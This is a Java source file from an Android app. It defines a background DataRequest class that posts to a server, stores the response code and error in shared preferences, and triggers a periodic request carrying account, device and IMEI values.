package com.inet.android.request;

import org.json.JSONException;
import org.json.JSONObject;

import com.inet.android.bs.Caller;
import com.inet.android.utils.Logging;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

/**
 * Data request class
 * @author johny homicide
 *
 */
public class DataRequest extends DefaultRequest {
	private final String LOG_TAG = "PeriodicRequest";
	Context ctx;

	public DataRequest(Context ctx) {
		super(ctx);
		this.ctx = ctx;
	}

	@Override
	public void sendRequest(String request) {
		RequestTask mt = new RequestTask();
		mt.execute(request);
	}

	class RequestTask extends AsyncTask<String, Void, Void> {

		@Override
		protected void onPreExecute() {
			super.onPreExecute();
		}

		@Override
		protected Void doInBackground(String... strs) {
			sendPostRequest(strs[0]);
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			super.onPostExecute(result);
		}
	}

	@Override
	protected void sendPostRequest(String request) {
		String str = Caller.doMake(request, "informative", ctx);
		if (str != null) {
			getRequestData(str);
		} else {
			Logging.doLog(LOG_TAG, "ответа от сервера нет", "ответа от сервера нет");
		}
	}

	@Override
	protected void getRequestData(String response) {
		String postRequest = null;

		Logging.doLog(LOG_TAG, "getResponseData: " + response, "getResponseData: " + response);

		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(ctx);

		JSONObject json = new JSONObject();
		try {
			json.put("account", sp.getString("account", "0000"));
			json.put("device", sp.getString("device", "0000"));
			json.put("imei", sp.getString("imei", "0000"));
		} catch (JSONException e) {
			e.printStackTrace();
		}
		postRequest = json.toString();

		JSONObject jsonObject = null;
		String str = null;
		try {
			jsonObject = new JSONObject(response);
			str = jsonObject.getString("code");
			Logging.doLog(LOG_TAG, "request: " + str);
		} catch (JSONException e) {
			str = null;
		}

		Editor ed = sp.edit();
		if (str != null) {
			ed.putString("code", str);
		} else {
			ed.putString("code", "");
		}

		if (str.equals("2")) {
			PeriodicRequest pr = new PeriodicRequest(ctx);
			pr.sendRequest(postRequest);
		}

		if (str.equals("0")) {
			String errstr = null;
			try {
				errstr = jsonObject.getString("error");
			} catch (JSONException e) {
				errstr = null;
			}
			if (errstr != null) {
				ed.putString("error", errstr);
			} else {
				ed.putString("error", "");
			}
			ed.commit();
		}
		ed.commit();
	}

}